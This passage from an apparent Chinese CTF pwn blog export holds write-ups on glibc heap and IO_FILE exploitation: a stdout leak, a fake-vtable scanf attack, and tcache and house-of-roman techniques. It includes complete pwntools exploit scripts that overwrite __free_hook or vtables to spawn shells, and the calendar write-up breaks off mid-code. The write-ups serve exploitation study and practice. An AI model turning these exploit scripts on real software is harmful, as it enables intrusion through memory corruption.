(f-&gt;_IO_write_ptr, s, count);1244 s += count;1245 to_do -= count;1246 &#125;1247 if (to_do + must_flush &gt; 0)1248 &#123;1249 size_t block_size, do_write;1250 /* Next flush the (full) buffer. */ //调用_IO_new_file_overflow1251 if (_IO_OVERFLOW (f, EOF) == EOF)1252 /* If nothing else has to be written we must not signal the1253 caller that everything has been written. */1254 return to_do == 0 ? EOF : n - to_do;1255 1256 /* Try to maintain alignment: write a whole number of blocks. */1257 block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;1258 do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);1259 1260 if (do_write)1261 &#123; //调用new_do_write1262 count = new_do_write (f, s, do_write);1263 to_do -= count;1264 if (count &lt; do_write)1265 return n - to_do;1266 &#125;1267 1268 ……1273 &#125;1274 return n - to_do;1275 &#125; 函数先调用_IO_OVERFLOW用于flush buffer，动态调试时可以看见对应的函数为_IO_new_file_overflow。正常情况下，IO_FILE中的_IO_read_XXX，_IO_write_XXX，_IO_buf_XXX指针的值比较相近，除了_IO_buf_end剩下的指针值都相同。（这个是我观察的，如果不对欢迎指正！）所以在下面的函数中，调用_IO_do_write读取从_IO_write_base到_IO_write_ptr的内容并没有输出，因为二者的值是相同的。12345678910111213pwndbg&gt; p *(struct _IO_FILE *) 0x7ffff7dd0720$8 = &#123; _flags = -72537977, _IO_read_ptr = 0x7ffff7dd07a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_read_end = 0x7ffff7dd07a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_read_base = 0x7ffff7dd07a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_base = 0x7ffff7dd07a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_ptr = 0x7ffff7dd07a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_end = 0x7ffff7dd07a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_base = 0x7ffff7dd07a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_end = 0x7ffff7dd07a4 &lt;_IO_2_1_stdout_+132&gt; "", ……&#125; 123456789101112131415161718192021222324252627282930737 int738 _IO_new_file_overflow (FILE *f, int ch)739 &#123;740 if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */741 &#123;742 ……744 return EOF;745 &#125;746 /* If currently reading or no buffer allocated. */747 if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)748 &#123;749 …… //修改_IO_XXX_XXX指针781 &#125;782 if (ch == EOF) //调用_IO_do_write读取_IO_write_ptr中的内容783 return _IO_do_write (f, f-&gt;_IO_write_base,784 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);785 if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */786 if (_IO_do_flush (f) == EOF)787 return EOF;788 *f-&gt;_IO_write_ptr++ = ch;789 if ((f-&gt;_flags &amp; _IO_UNBUFFERED)790 || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == '\n')) //调用_IO_do_write读取_IO_write_ptr中的内容791 if (_IO_do_write (f, f-&gt;_IO_write_base,792 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)793 return EOF;794 return (unsigned char) ch;795 &#125; 接着会调用new_do_write函数。block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base=1，则do_write = to_do= n。 在new_do_write中调用_IO_SYSWRITE，向fp中输出data（上面的s）中的to_do（上面的do_write）个字符。 123456789101112131415161718192021222324252627282930437 static size_t438 new_do_write (FILE *fp, const char *data, size_t to_do)439 &#123;440 size_t count;441 if (fp-&gt;_flags &amp; _IO_IS_APPENDING)442 /* On a system without a proper O_APPEND implementation,443 you would need to sys_seek(0, SEEK_END) here, but is444 not needed nor desirable for Unix- or Posix-like systems.445 Instead, just indicate that offset (before and after) is446 unpredictable. */447 fp-&gt;_offset = _IO_pos_BAD;448 else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)449 &#123;450 off64_t new_pos451 = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);452 if (new_pos == _IO_pos_BAD)453 return 0;454 fp-&gt;_offset = new_pos;455 &#125; //调用_IO_SYSWRITE456 count = _IO_SYSWRITE (fp, data, to_do);457 if (fp-&gt;_cur_column &amp;&amp; count)458 fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;459 _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);460 fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;461 fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0462 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))463 ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);464 return count;465 &#125; 总结一下，也就是正常使用时，_IO_write_ptr和_IO_write_base的值是相等的，调用_IO_OVERFLOW也不会输出内容，接着执行_IO_SYSWRITE输出data，也就是puts的参数。 但是如果我们能够修改_IO_write_base中的值，使它指向想要泄露的地址，那么在_IO_OVERFLOW中就能输出内容。 1_IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); _IO_do_write也是通过new_do_write实现的。为了通过该方法进行泄露，对一些值进行设置，绕过new_do_write里一些不需要的流程。 参考了vigneshsrao 的思路，观察_IO_new_file_overflow和new_do_write： 绕过_IO_new_file_overflow中的 if (f-&gt;_flags &amp; _IO_NO_WRITES) 防止在执行 _IO_do_write之前返回，其中_IO_NO_WRITES为0x8 绕过_IO_new_file_overflow中的if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) 防止对我们设置好的指针进行重新赋值，使(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)==1，_IO_CURRENTLY_PUTTING为0x800 绕过new_do_write 中的 else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) 防止在执行_IO_SYSWRITE之前return。vigneshsrao中给出的方法是，干脆不走这个else if，直接走上面的if (fp-&gt;_flags &amp; _IO_IS_APPENDING)，其中_IO_IS_APPENDING=0x1000。 综上，flag的值可以设置为0xfbad1800。由于我们要修改_IO_write_base的值，就把flag到_IO_write_base之间的_IO_read_XXX设置为0。然后修改_IO_write_base为想要泄露的地址。这里我修改的是让_IO_write_base指向自己所在的地址，即stdout+0x20，这样就能输出stdout+0x20中的内容，进而泄露libc地址。 覆写free_hook为system修改一个位于tcache中的block的FD指针，指向free_hook。此时tcache0x50-&gt;堆-&gt;free_hook，而且由于指向stdout的note如果释放会出错（因为size位对应stderr中的值，非常大，释放时要通过size寻找inuse位）所以notes只剩1个，直接分配肯定不能分到free_hook。因此先把堆上的块分配出去，修改它的size为0x61，此时再释放这个块，它就会进入到tcache 0x60中，这样剩余的note正好分到free_hook。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108from pwn import *context.log_level = 'debug'import random,structdebug = 1if debug: p = process('./three')#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125; libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p=remote('39.96.13.122',9999) libc = ELF('./libc.so.6')def add(content): p.sendlineafter("Your choice:",'1') p.sendafter("Input the content:",content)def edit(idx,content): p.sendlineafter("Your choice:",'2') p.sendlineafter("Input the idx:",str(idx)) p.sendafter("Input the content:",content)def dele(idx,c): p.sendlineafter("Your choice:",'3') p.sendlineafter("Input the idx:",str(idx)) p.sendlineafter("Clear?(y/n):",c)def get_base(p1): f = open('/proc/'+str(pidof(p1)[0])+'/maps','r') while 1: tmp = f.readline() print tmp if 'libc-2.26.so' in tmp: libc_addr = int('0x'+tmp.split('-')[0],16) f.close() break print '[+] libc_addr :',hex(libc_addr) return libc_addr#for unsortedbin check inuseadd('0'*0x3f+'\n')add('0'*0x3f+'\n')add('1'*8+p64(0x21)+p64(0)*3+p64(0x21))dele(2,'y')dele(1,'y')dele(0,'y')add(p64(0)*3+p64(0x91)+p64(0)+'\n')#0 260;make 280'size = 0x91add('0gur1\n')#1 2b0dele(1,'y')#tcache 0x50-&gt;2b0dele(0,'n')#tcache 0x50-&gt;260-&gt;2b0edit(0,'\x80')#tcache 0x50-&gt;260-&gt;280add('1gur1\n')#1-&gt;0 260add('2gur1\n')#2-&gt;0+0x20 280dele(2,'n')dele(2,'n')dele(2,'n')dele(2,'n')dele(2,'n')dele(2,'n')dele(2,'n')#tcache 0x90 full with 280edit(0,p64(0)*3+p64(0x51))#change 280's size to 0x51dele(1,'y')#tcache 0x50-&gt;260dele(2,'n')#tcache 0x50-&gt;280-&gt;260edit(0,p64(0)*3+p64(0x91))#change 280's size to 0x91dele(2,'y')#put 280 in unsortedbin;tcache 0x50-&gt;280-&gt;main+88if debug: libc_base = get_base(p) stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_'] d = (stdout_addr)&amp;0xffff c = struct.pack('cc',chr(d&amp;0xff),chr(d&gt;&gt;8&amp;0xff)) edit(0,p64(0)*3+p64(0x91)+c)#tcache 0x50-&gt;280-&gt;&amp;stdoutelse: edit(0,p64(0)*3+p64(0x91)+'\x60\xf7')#tcache 0x50-&gt;280-&gt;&amp;stdoutadd('1gur1\n')#1-&gt;280if debug: add(p64(0xfbad1800)+p64(0)*3+'\x40')#2-&gt;&amp;stdout,edit stdout's flag and pointerelse: add(p64(0xfbad1800)+p64(0)*3+'\x80')#2-&gt;&amp;stdout,edit stdout's flag and pointer#puts leak libc addresslibc_addr = u64(p.recv(8))-0x20-libc.symbols['_IO_2_1_stdout_']log.info("libc_addr:%#x",libc_addr)free_hook = libc_addr +libc.symbols['__free_hook']sys_addr = libc_addr +libc.symbols['system']edit(0,p64(0)*3+p64(0x51))#change 280's size to 0x51dele(1,'y')#tcache 0x50-&gt;280edit(0,p64(0)*3+p64(0x51)+p64(free_hook))#tcache 0x50-&gt;280-&gt;free_hookadd('1gur1\n')#1-&gt;280edit(0,'/bin/sh\0'+p64(0)*2+p64(0x61))#change 280's size t0 0x61,not to put into tacache 0x50;tcache 0x50 -&gt;free_hookdele(1,'y')#tcache 0x60-&gt;280;tcache 0x50 -&gt;free_hookadd(p64(sys_addr))#write free_hook to systemp.sendlineafter("Your choice:",'3')p.sendlineafter("Input the idx:",str(0))p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scanf的IO利用]]></title>
    <url>%2F2018%2F11%2F12%2Fscanf%E7%9A%84IO%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[之前写过IO_FILE的利用，只是在资料里看到scanf也能用，却没有做到对应的题目，也没有亲自调过，在xctf决赛时候的第一题，看见了sscanf以及bss上的溢出，以为可以用，但是sscanf是对字符串操作而不是IO，于是没有成功，但是还是好奇scanf应该怎么用。于是自己写了一个小程序，尝试修改bss上stdin的地址，并满足scanf中一系列的参数要求，最终完成利用。 漏洞程序12345678910111213141516171819202122232425#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;long int a[10];char b[1024];void sys()&#123; system("cat flag");&#125;int main()&#123; //使用了setvbuf才会在bss段里写入stdin，stdout和stderr的地址 setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); int i=0; puts("input idx:"); scanf("%10d",&amp;i); //数组越界 puts("input num:"); scanf("%ld",&amp;a[i]); puts("input content:"); read(0,b,1024); scanf("%d",&amp;i);&#125; 这里最后一个scanf是为了触发漏洞，调用stdin的vtable。 漏洞利用由于存在数组越界，覆写bss中的stdin地址，然后在b数组里伪造一个_IO_FILE_plus结构和一个_IO_jump_t结构，让stdin指向数组b即可。 之前一直不理解，在IO时候究竟是怎么使用bss上的stdin的，看了libc中的汇编指令，_isoc99_scanf在调用_IO_vfscanf之前，参数存放在rdi中，而rdi的值是[r8]中的值。而r8是从stdin_ptr中读出的。 而stdin_ptr位于libc的got表中。 1.got:00000000003C3FB0 stdin_ptr dq offset stdin ; DATA XREF: scanf+8C↑r 通过动态调试，发现stdin_ptr中存放的值就是bss段上stdin的地址： 也就是说r8为bss中的地址，那么[r8]就对应着bss上这个地址中存放的内容。正常情况下，里面会写入libc中stdin的地址。但是，当把bss中stdin内容修改为数组b时，_IO_vscanf的参数就变成了数组b，即将数组b看作一个_IO_FILE_plus结构。 伪造的_IO_FILE_plus结构需要满足一些条件： fp._lock要填入一个地址，且fp._lock+8也是一个地址 123&lt;__isoc99_scanf+117&gt; mov rdx, qword ptr [rbx + 0x88] //rbx+0x88对应着fp._lock&lt;__isoc99_scanf+124&gt; mov r9, qword ptr fs:[0x10]&lt;__isoc99_scanf+133&gt; cmp r9, qword ptr [rdx + 8] ​ fp._lock中地址对应的值为0，希望以eax和[rdx]相等的姿态完成这个操作。这里cmpxch指令的含义是，比较[rdx]和累加器eax中的值，若相等，将esi地址对应的值装载到[rdx]，zf置1；若不等，则将[rdx]的值加载到eax，zf置零。 12&lt;__isoc99_scanf+165&gt; cmpxchg dword ptr [rdx], esi &lt;0x6014a0&gt;//0x6014a0为数组a的地址&lt;__isoc99_scanf+168&gt; je __isoc99_scanf+192 &lt;0x7feb6538f590&gt; ——————————满足以上条件将进入到_IO_vscanf函数中————————————— fp._flag的最低字节的第3位不能为1，不走jne这条指令： 12&lt;_IO_vfscanf+164&gt; test al, 4&lt;_IO_vfscanf+166&gt; jne _IO_vfscanf+9928 &lt;0x7ffff7a6af48&gt; ——————————满足以上条件将进入到__uflow函数中—————————————— fp._flag的值存放在rdx中，判断rdx的第二个字节（低）的第四位是否为1，期望值是不为1，不会执行下一条jne。 12&lt;__uflow+26&gt; test dh, 8&lt;__uflow+29&gt; jne __uflow+152 &lt;0x7feb6539f438&gt; fp._markers应该为0，否则就会进入到奇怪的分支中。 12&lt;__uflow+49&gt; cmp qword ptr [rbx + 0x60], 0&lt;__uflow+54&gt; ✔ je __uflow+272 &lt;0x7feb6539f4b0&gt; ——————————满足以上条件将进入到fp.vtable.underflow处执行—————————— 正常情况下是在underflow里面调用xgets，即vtable.xgets，但既然已经跳转到vtable中的underflow了，不如直接把underflow处对应的地址修改为system地址。 fp的_IO_read_XXX,_IO_write_XXX,_IO_buf_XXX之类的值都填成0比较安全，否则会进入到奇怪的分支中。 最后构造的fp如下： 1234567file_struct = '12;sh'+'\x00'*3#_flag：0x733b3231 最低字节0x31的第三位为0；第二个字节0x32的第四位为0file_struct +=p64(0)*11 #11个IO指针file_struct +=p64(0)*5 #_lock之前，包含_markersfile_struct +=p64(0x6014a0) #_lock：0x6014a0 _lock是一个地址（数组a)，且地址中的内容为0；_lock+8也是一个地址file_struct +=p64(0)*9 #vtable之前file_struct +=p64(b_addr+224) #vtable地址vtable = p64(0x40079f)*9 #vtable中内容 其中_flag既要满足限制条件，也要包含system要执行的参数，因此用”;”隔开，顺序执行指令。 利用脚本12345678910111213141516171819202122from pwn import *context.log_level='debug'p = process('./fp_scanf')p.sendlineafter("input idx:\n",'-134')b_addr = 0x6010a0p.sendlineafter("input num:\n",str(int(b_addr)))gdb.attach(p)file_struct = '12;sh'+'\x00'*3file_struct +=p64(0)*11file_struct +=p64(0)*5file_struct +=p64(0x6014a0)file_struct +=p64(0)*9file_struct +=p64(b_addr+224)vtable = p64(0x40079f)*9payload = file_struct+vtablep.sendlineafter("input content:\n",payload)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018护网杯线上赛pwn]]></title>
    <url>%2F2018%2F10%2F22%2F2018%E6%8A%A4%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn%2F</url>
    <content type="text"><![CDATA[task_shoppingCart基本逻辑程序分为给钱和购物两部分。 给钱部分只有给钱一个功能，money结构体中包含type和amount两个字段。给钱的时候先创建一个money结构体，然后将写好的结构体放入money_list中。 12345678910111213141516171819202122232425262728293031struct money&#123; char * type; int amount;&#125;int add_money()&#123; void *v0; // rax money *v1; // rax money *v2; // ST08_8 __int64 v3; // rax signed __int64 v4; // rcx if ( (unsigned __int64)money_num &lt;= 0x13 ) &#123; puts("I will give you $9999, but what's the currency type you want, RMB or Dollar?"); v1 = (money *)malloc(0x10uLL); v2 = v1; v1-&gt;amount = 9999LL; fgets(&amp;type[8 * money_num], 8, stdin); v2-&gt;type = &amp;type[8 * money_num]; v3 = money_num++; v4 = 8 * v3; v0 = &amp;money_list; *(_QWORD *)((char *)&amp;money_list + v4) = v2; &#125; else &#123; LODWORD(v0) = puts("You already have enough money!"); &#125; return (signed int)v0;&#125; 购物环节有三个功能：add、modify和remove。 add_goods添加goods结构，并对name字符串的末尾置零。 1234567891011121314151617181920212223242526272829303132struct goods&#123; char *name; int price;&#125;unsigned __int64 add_goods()&#123; unsigned __int64 size; // ST10_8 goods *v1; // ST18_8 __int64 v2; // rax char s; // [rsp+20h] [rbp-20h] unsigned __int64 v5; // [rsp+38h] [rbp-8h] v5 = __readfsqword(0x28u); if ( (unsigned __int64)goods_num &lt;= 0x13 ) &#123; puts("How long is your goods name?"); fgets(&amp;s, 24, stdin); size = strtoul(&amp;s, 0LL, 0); v1 = (goods *)malloc(0x10uLL); v1-&gt;price = 999LL; v1-&gt;name = (char *)malloc(size); puts("What is your goods name?"); v1-&gt;name[(signed int)read(0, v1-&gt;name, size) - 1] = 0; v2 = goods_num++; goods_list[v2] = v1; &#125; else &#123; puts("Your shopping cart is full now!"); &#125; return __readfsqword(0x28u) ^ v5;&#125; remove_goods释放name后再释放goods结构体。12345678910111213141516171819202122232425262728unsigned __int64 remove_goods()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-28h] char s; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); puts("Which goods that you don't need?"); fgets(&amp;s, 24, stdin); v1 = strtoul(&amp;s, 0LL, 0); if ( v1 &lt;= goods_num ) release(v1); else puts("That goods is out of your cart."); return __readfsqword(0x28u) ^ v3;&#125;_QWORD *__fastcall release(__int64 a1)&#123; _QWORD *result; // rax puts("You really don't need it?"); free(*(void **)goods_list[a1]); free((void *)goods_list[a1]); result = goods_list; goods_list[a1] = 0LL; return result;&#125; modify_goods先打印name，然后修改name的内容，只能修改8字节。 123456789101112131415unsigned __int64 modify_goods()&#123; unsigned __int64 v0; // rax __int64 v1; // ST00_8 char s; // [rsp+10h] [rbp-20h] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); puts("Which goods you need to modify?"); fgets(&amp;s, 24, stdin); v0 = strtoul(&amp;s, 0LL, 0); printf("OK, what would you like to modify %s to?\n", *(_QWORD *)goods_list[v0], v0); *(_BYTE *)(*(_QWORD *)goods_list[v1] + read(0, *(void **)goods_list[v1], 8uLL)) = 0; return __readfsqword(0x28u) ^ v4;&#125; bugadd_goods中，当输入的size为0时，则相当于向name[-1]的位置中写入\x00，而name并没有在结尾写入\x00，由此可以泄露地址。 1v1-&gt;name[(signed int)read(0, v1-&gt;name, size) - 1] = 0; 另外，modify_goods函数中存在数组越界的问题，对输入的index没有做检查，能够执行写操作。 123v0 = strtoul(&amp;s, 0LL, 0);printf("OK, what would you like to modify %s to?\n", *(_QWORD *)goods_list[v0], v0);*(_BYTE *)(*(_QWORD *)goods_list[v0] + read(0, *(void **)goods_list[v0], 8uLL)) = 0; 漏洞利用通过add_goods泄露libc地址，先分配一个大于fastbin的块并释放，该块将放入unsortedbin中，FD和BK中为libc中的地址；再add一个size=0的块时，将从该unsortedbin中分配，读入内容时相当于向块的前一个地址中写入一个0，而字符的结尾没有写0，因此可以泄露libc地址。 本题中没有使用setvbuf，stdin等标准输入输出的读写空间都是在堆上分配的。 12345678910111213141516171819202122232425262728pwndbg&gt; heapTop Chunk: 0x55f3ddcb7900Last Remainder: 0x55f3ddcb76e00x55f3ddcb6000 PREV_INUSE &#123; stdout prev_size = 0, size = 1041, fd = 0x797562202c776f4e, bk = 0x7975622079756220, fd_nextsize = 0x20656b696c200a21, bk_nextsize = 0x6669646f6d206f74&#125;0x55f3ddcb6410 PREV_INUSE &#123; stdin prev_size = 0, size = 4113, fd = 0xa72610a360a32, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x55f3ddcb7420 FASTBIN &#123; prev_size = 0, size = 33, fd = 0x55f3dd9400a0, bk = 0x270f, fd_nextsize = 0x0, bk_nextsize = 0x21&#125; 因此，其他的堆分配是从0xXXX7420（其中7不是固定的）开始的。也就是说，分配的第一个money结构体money[0]，起始地址就是0xXXXXXX7420（其中7不是固定的）。 利用数组越界，如果在modify_good时候输入idx指向money中的最后一个元素即money[19]，就会向type[19]中输入8个字节，而modify_good会向type[19]中写入8字节后，在末尾添加一个0，如下图所示，money和type在bss段是相邻的，这个0会溢出到money[0]中，使得money[0]的地址由0xXXXXXX7420变为0xXXXXXX7400，而0xXXXXXX7400恰好是位于stdin的_IO_read_str指向的空间。如果向stdin输入足够长的字符，直到0xXXXXXX7400，并在0xXXXXXX7400处写入free_hook的地址，再modify money[0]的时候，即相当于向free_hook里写入。 12345678.bss:0000000000202098 money_num dq ? ; DATA XREF: add_money+8↑r.bss:0000000000202098 ; add_money+53↑r ....bss:00000000002020A0 ; char type[160].bss:00000000002020A0 type db 0A0h dup(?) ; DATA XREF: add_money+62↑o.bss:00000000002020A0 ; add_money+8B↑o.bss:0000000000202140 ; _QWORD *money_list.bss:0000000000202140 money_list dq ? ; DATA XREF: add_money+B6↑o.bss:00000000002021E0 goods_list dq 14h dup(?) ; DATA XREF: add_goods+FB↑o 需要注意的是，read不会从_IO_FILE结构中的指针读取内容，而是直接进行系统调用；fgets则是从_IO_FILE结构中读取数据。在add_goods时，name是用read读取的，idx则是用fgets，因此在输入idx时，输入足够长的内容就可以填充到0xXXXXXX7400处。 利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *context.log_level='debug'debug=1if debug: p = process('./2_task_shoppingCart')else: p = remote("49.4.78.29", 30289)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')unsorted_offset = 0x7f0e626fec78-0x7f0e6233a000def money(dollar): p.sendlineafter("EMMmmm, you will be a rich man!\n",'1') p.sendlineafter("I will give you $9999, but what's the currency type you want, RMB or Dollar?\n",dollar)def shop(): p.sendlineafter("EMMmmm, you will be a rich man!\n",'3')def add_goods(name,length): p.sendlineafter("Now, buy buy buy!\n",'1') p.sendlineafter("How long is your goods name?\n",length) p.sendafter("What is your goods name?",name)def remove_goods(idx): p.sendlineafter("Now, buy buy buy!\n",'2') p.sendlineafter("Which goods that you don't need?\n",str(idx))def modify_goods(new_name,idx): p.sendlineafter("Now, buy buy buy!\n",'3') p.sendlineafter("Which goods you need to modify?\n",idx) p.sendafter("to?\n",new_name) for i in range(20): money("dollar")#leak libc shop()add_goods("0"*8+'\x00','256')#0add_goods('/bin/sh\x00','256')#1remove_goods(0)add_goods("",'0')#2p.sendlineafter("Now, buy buy buy!\n",'3')p.sendlineafter("Which goods you need to modify?\n",'2')p.recvuntil(" like to modify ")libc_addr =u64( p.recv(6).ljust(8,'\x00'))-unsorted_offsetsys_addr = libc_addr + libc.symbols['system']free_hook = libc_addr + libc.symbols['__free_hook']log.info('libc_addr:%#x',libc_addr)log.info('sys_addr:%#x',sys_addr)log.info('free_hook:%#x',free_hook)p.sendafter("to?\n","12345678")#4x0-&gt;400idx = ((0x2021d8-0x2021e0)/8)&amp;0xffffffffffffffffmodify_goods("abcdefgh",str(idx))#write free_hook at money[0]&amp;padding = 0x9400-0x8420add_goods('a'*8,(str(padding+0x10)+'\n').ljust(padding,'a')+p64(free_hook))#overwrite free_hookgdb.attach(p)idx = ((0x202140-0x2021e0)/8)&amp;0xffffffffffffffffif debug: #modify_goods(p64(sys_addr),(str(idx).ljust(24,'\x00')).ljust(padding,'1')+p64(free_hook)) modify_goods(p64(sys_addr),str(idx))else: modify_goods(p64(sys_addr),(str(idx)+'\n' + str('2')+'\n' + str('1')+'\n').ljust(0x100,'\n')+p64(free_hook)*0x5f)#shellremove_goods(1)p.interactive() task_calendar基本逻辑程序有三个主要功能，add，edit和remove，有两个全局的数组存放地址和size。 add函数分配新的堆块，size限制在0~0x68之间，并在数组中记录信息。其中get_day()用于输入的星期。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152int add()&#123; _QWORD *v0; // rax int idx; // [rsp+8h] [rbp-8h] int size; // [rsp+Ch] [rbp-4h] LODWORD(v0) = get_day(); idx = (signed int)v0; if ( (_DWORD)v0 != -1 ) &#123; printf("size&gt; "); LODWORD(v0) = read_int(); size = (signed int)v0; if ( (signed int)v0 &gt;= 0 &amp;&amp; (signed int)v0 &lt;= 0x68 ) &#123; addr_list[idx] = malloc((signed int)v0); v0 = size_list; size_list[idx] = size; &#125; &#125; return (signed int)v0;&#125;signed __int64 get_day()&#123; signed __int64 result; // rax int v1; // [rsp+Ch] [rbp-4h] puts("which day: "); puts("1. Monday"); puts("2. Tuesday"); puts("3. Wednesday"); puts("4. Thursday"); puts("5. Friday"); puts("6. Saturday"); puts("7. Sunday"); printf("choice&gt; "); v1 = read_int() - 1; if ( v1 &lt;= 3 || v1 &gt; 6 ) &#123; if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 3 ) result = (unsigned int)v1; else result = 0xFFFFFFFFLL; &#125; else &#123; puts("These days are rest time."); result = 0xFFFFFFFFLL; &#125; return result;&#125; edit函数向分配好的地址内写入内容，其中用到了read_n_off_by_one，这个函数中存在一字节的溢出：规定读入的长度为a2，但在循环时读入了a2+1个字节。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int edit()&#123; unsigned __int64 __idx; // rax int idx; // [rsp+8h] [rbp-8h] signed int v3; // [rsp+Ch] [rbp-4h] LODWORD(__idx) = get_day(); idx = __idx; if ( (_DWORD)__idx != -1 ) &#123; __idx = addr_list[(signed int)__idx]; if ( __idx ) &#123; printf("size&gt; "); LODWORD(__idx) = read_int(); v3 = __idx; // new size if ( (signed int)__idx &gt; 0 ) &#123; __idx = size_list[idx]; // origin size if ( v3 &lt;= __idx ) &#123; printf("info&gt; "); LODWORD(__idx) = read_n_off_by_one(addr_list[idx], v3); &#125; &#125; &#125; &#125; return __idx;&#125;__int64 __fastcall read_n_off_by_one(__int64 a1, signed int a2)&#123; char buf; // [rsp+13h] [rbp-Dh] unsigned int i; // [rsp+14h] [rbp-Ch] unsigned __int64 v5; // [rsp+18h] [rbp-8h] v5 = __readfsqword(0x28u); for ( i = 0; (signed int)i &lt;= a2; ++i ) //i=0~a2 &#123; if ( (signed int)read(0, &amp;buf, 1uLL) &lt;= 0 ) &#123; puts("read error"); exit(0); &#125; if ( buf == 10 ) &#123; *(_BYTE *)((signed int)i + a1) = 0; return i; &#125; *(_BYTE *)(a1 + (signed int)i) = buf; &#125; return i;&#125; remove释放地址对应的内存，没有对指针置零。而且上面也注意到，add和edit时并不检查数组是否为零等情况，因此可以多次释放、写入。 12345678void remove()&#123; int v0; // [rsp+Ch] [rbp-4h] v0 = get_day(); if ( v0 != -1 ) free((void *)addr_list[v0]);&#125; bugedit时能够造成一字节的溢出，可以覆写下一堆块的size字段。并且free后的不置零，存在UAF和double free漏洞。但本题没有输出，不能用常规方法泄露地址。 漏洞利用要对以上的漏洞进行利用，涉及一个对我来说新的知识点：house of roman。该方法可以参考hackedbylh的《House of Roman实战》。 我对House of Roman的理解是，充分利用main_arena+88这个数据，它是main_arena中unsortedbin头的地址，通过简单的变形能够得到main_arena和malloc_hook的地址。利用方法为： 释放一个块到unsorted bin，并重新分配，保证FD，BK为main_arena+88。通过溢出修改该unsorted bin的size为0x71。 利用UAF构成fastbin attack，将unsorted bin链入到0x70的fastbin中，并修改unsorted bin的FD为malloc_hook-0x23地址（main_arena-0x10-0x23），此处恰好能凑成一个size字段为0x7f的块，使fastbin中结构为：fb_header-&gt;0x70chunk-&gt;unsorted bin chunk -&gt; malloc_hook-0x23 利用unsorted bin attack的bck-&gt;fd = unsorted_chunks(av)，修改malloc_hook为main_arena+88 编辑malloc_hook-0x23的块，向malloc_hook写入one_gadget 本题中存在溢出，能够修改size；存在UAF，能够利用fastbin attack和unsorted bin attack，可以使用house of roman。 参照上面的步骤： 构造unsorted bin 不能直接分配unsortedbin大小的块，利用溢出。 1234567891011add(0,0x60) #0x00add(0,0x60) #0x70add(0,24) #0xe0add(1,0x60) #0x100add(2,0x60) #0x170add(3,0x60) #0x1e0edit(0,24,'0'*24+'\xe1')remove(1)add(0,0x60)add(0,0x60) 前面多分配的两块0x60是有用的，后面要用到；后面分配的两个0x60用来消耗unsorted bin。 fastbin attack 123remove(2)remove(3)edit(3,1,'\n') 在释放两个fastbin后，#3中FD的值为#2的地址，即0xXXXXXXXXX170，在edit时输入\n会被转换为00写入，即FD变成0xXXXXXXXXX100，即指向了#1，而#1的FD为main_aren+88，因此fastbin为：#3-&gt;#1-&gt;main_aren+88。 PS：因为read_n_off_by_one函数中用的是read函数，所以会等到读入足够的字节数才会返回，而且由于read_n_off_by_one多读入一个字节，当想读入1个字节时，传入的参数只能为0或者直接输入\n，而当参数为0时不能通过内部的检查，因此必须通过输入\n来实现写入一个字节。\n会转为\0，所以要分配第一步中的前两个chunk，使得#1的地址以\x00结尾。 12345bytes = (get_base(p)+libc.symbols['__malloc_hook']-0x23)&amp;0xffffedit(1,1,p32(bytes)[:-2]) #change main_aren+88 to 